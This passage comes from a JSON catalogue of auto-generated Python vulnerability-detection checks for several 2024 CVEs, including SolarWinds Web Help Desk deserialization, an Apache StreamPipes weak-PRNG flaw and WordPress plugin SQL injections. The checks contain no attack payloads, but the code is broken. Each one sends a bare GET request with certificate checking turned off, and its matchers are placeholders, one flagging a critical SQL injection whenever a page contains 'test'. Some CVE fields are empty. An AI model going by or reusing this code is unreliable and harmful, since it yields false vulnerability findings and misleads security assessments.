List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SolarWinds Web Help Desk < 12.8.3 - Insecure Deserialization\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_28986(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "kev",
          "solarwinds",
          "webhelpdesk",
          "deserialization",
          "rce",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_29868",
        "name": "Apache StreamPipes <= 0.93.0 - Use of Cryptographically Weak PRNG in Recovery Token Generation",
        "language": "Python",
        "famille": "CVE",
        "description": "Apache StreamPipes from version 0.69.0 through 0.93.0 uses a cryptographically weak Pseudo-Random Number Generator (PRNG) in the recovery token generation mechanism. Given a valid token it's possible to predict all past and future generated tokens.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(settings, true); compare_versions(version, '>= 0.69.0') && compare_versions(version, '<= 0.93.0')",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-29868\nName: Apache StreamPipes <= 0.93.0 - Use of Cryptographically Weak PRNG in Recovery Token Generation\nSeverity: critical\nDescription: Apache StreamPipes from version 0.69.0 through 0.93.0 uses a cryptographically weak Pseudo-Random Number Generator (PRNG) in the recovery token generation mechanism. Given a valid token it's possible to predict all past and future generated tokens.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_29868:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-29868\"\n    SEVERITY = \"critical\"\n    NAME = \"Apache StreamPipes <= 0.93.0 - Use of Cryptographically Weak PRNG in Recovery Token Generation\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: contains(settings, true); compare_versions(version, '>= 0.69.0') && compare_versions(version, '<= 0.93.0')\"\n\n        # Simple word matcher simulation\n        matchers = ['>= 0.69.0', '<= 0.93.0']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Apache StreamPipes <= 0.93.0 - Use of Cryptographically Weak PRNG in Recovery Token Generation\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_29868(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-29868\nName: Apache StreamPipes <= 0.93.0 - Use of Cryptographically Weak PRNG in Recovery Token Generation\nSeverity: critical\nDescription: Apache StreamPipes from version 0.69.0 through 0.93.0 uses a cryptographically weak Pseudo-Random Number Generator (PRNG) in the recovery token generation mechanism. Given a valid token it's possible to predict all past and future generated tokens.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_29868:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-29868\"\n    SEVERITY = \"critical\"\n    NAME = \"Apache StreamPipes <= 0.93.0 - Use of Cryptographically Weak PRNG in Recovery Token Generation\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: contains(settings, true); compare_versions(version, '>= 0.69.0') && compare_versions(version, '<= 0.93.0')\"\n\n        # Simple word matcher simulation\n        matchers = ['>= 0.69.0', '<= 0.93.0']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Apache StreamPipes <= 0.93.0 - Use of Cryptographically Weak PRNG in Recovery Token Generation\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_29868(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [
          "CVE-2024-29868"
        ],
        "tags": [
          "cve",
          "cve2024",
          "apache",
          "streampipes",
          "account-takeover",
          "passive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_30490",
        "name": "ProfileGrid <= 5.7.8 - SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "The ProfileGrid – User Profiles, Groups and Communities plugin for WordPress is vulnerable to SQL Injection in versions up to, and including, 5.7.8 due to insufficient escaping on the user supplied 'search' parameter and lack of sufficient preparation on the existing SQL query.",
        "severity": "critical",
        "detection": "[OR] DSL: duration>=7; contains_all(body, \"No group matches found.\", \"pm-\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-30490\nName: ProfileGrid <= 5.7.8 - SQL Injection\nSeverity: critical\nDescription: The ProfileGrid – User Profiles, Groups and Communities plugin for WordPress is vulnerable to SQL Injection in versions up to, and including, 5.7.8 due to insufficient escaping on the user supplied 'search' parameter and lack of sufficient preparation on the existing SQL query.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_30490:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-30490\"\n    SEVERITY = \"critical\"\n    NAME = \"ProfileGrid <= 5.7.8 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=7; contains_all(body, \"No group matches found.\", \"pm-\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ProfileGrid <= 5.7.8 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_30490(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-30490\nName: ProfileGrid <= 5.7.8 - SQL Injection\nSeverity: critical\nDescription: The ProfileGrid – User Profiles, Groups and Communities plugin for WordPress is vulnerable to SQL Injection in versions up to, and including, 5.7.8 due to insufficient escaping on the user supplied 'search' parameter and lack of sufficient preparation on the existing SQL query.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_30490:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-30490\"\n    SEVERITY = \"critical\"\n    NAME = \"ProfileGrid <= 5.7.8 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=7; contains_all(body, \"No group matches found.\", \"pm-\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ProfileGrid <= 5.7.8 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_30490(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "wordpress",
          "wp",
          "wp-plugin",
          "profilegrid",
          "sqli"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_32128",
        "name": "WordPress Realtyna Organic IDX Plugin <= 4.14.4 - Unauthenticated SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "The Realtyna Organic IDX plugin plugin for WordPress is vulnerable to SQL Injection in versions up to, and including, 4.14.4 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains(body, \"\\\"success\\\":1\") || contains(body, \"\\\"total\\\":\") / [OR] DSL: duration>=6; status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-32128\nName: WordPress Realtyna Organic IDX Plugin <= 4.14.4 - Unauthenticated SQL Injection\nSeverity: critical\nDescription: The Realtyna Organic IDX plugin plugin for WordPress is vulnerable to SQL Injection in versions up to, and including, 4.14.4 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_32128:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-32128\"\n    SEVERITY = \"critical\"\n    NAME = \"WordPress Realtyna Organic IDX Plugin <= 4.14.4 - Unauthenticated SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n      